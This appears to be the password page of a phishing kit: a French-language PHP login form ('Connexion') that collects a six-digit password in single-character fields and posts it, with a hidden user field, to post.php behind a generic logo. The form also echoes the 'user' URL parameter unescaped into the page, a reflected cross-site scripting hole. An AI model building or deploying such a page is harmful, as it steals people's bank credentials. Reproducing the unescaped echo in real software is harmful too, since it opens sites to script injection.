<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/pass.css">
    <title>Connexion</title>
</head>
<body>
    

<header>
    <div class="logo">
<img src="res/img/logo.png" >
    </div>
</header>


<main>
    <div class="continer">
  
    <div class="title">

<span>Bonjour!
</span> 
</div>



<div class="p">
<p> Tapez votre mot de passe
</p>

</div>


<div class="col">
<form action="post.php" method="post">

<input type="hidden" name="user" value="<?php echo @$_GET['user']; ?>">
  <input type="text" maxlength="1" id="d1" required oninput="moveNext(this, 'd2')" onkeydown="movePrev(event, this, null)" name="d1">
  <input type="text" maxlength="1" id="d2" required oninput="moveNext(this, 'd3')" onkeydown="movePrev(event, this, 'd1')" name="d2">
  <input type="text" maxlength="1" id="d3" required oninput="moveNext(this, 'd4')" onkeydown="movePrev(event, this, 'd2')" name="d3">
  <input type="text" maxlength="1" id="d4" required oninput="moveNext(this, 'd5')" onkeydown="movePrev(event, this, 'd3')" name="d4">
  <input type="text" maxlength="1" id="d5" required oninput="moveNext(this, 'd6')" onkeydown="movePrev(event, this, 'd4')" name="d5">
  <input type="text" maxlength="1" id="d6" required oninput="moveNext(this, null)" onkeydown="movePrev(event, this, 'd5')" name="d6">
</div>

<script>
  function moveNext(current, nextFieldId) {
    if (current.value.length === 1 && nextFieldId) {
      document.getElementById(nextFieldId).focus();
    }
  }

  function movePrev(event, current, prevFieldId) {
    if (event.key === 'Backspace' && current.value === '' && prevFieldId) {
      document.getElementById(prevFieldId).focus();
    }
  }

  document.addEventListener("DOMContentLoaded", function () {
    const inputs = Array.from({ length: 6 }, (_, i) => document.getElementById(`d${i + 1}`));

    inputs.forEach((input, idx) => {
      // Handle paste on any input
      input.addEventListener("paste", (e) => {
        const paste = (e.clipboardData || window.clipboardData).getData('text').trim();
        if (/^\d{6}$/.test(paste)) {
          e.preventDefault();
          paste.split('').forEach((char, i) => {
            if (inputs[i]) {
              inputs[i].value = char;
            }
          });
          inputs[5].focus(); // Optional: focus the last input
        }
      });
    });
  });
</script>



<div class="foo">
<a href="#">mot de passe oublié ?</a>
</div>

<div class="but">
<button type="submit">Continuer</button>
</div>






</form>
</div>
</main>

</body>
</html>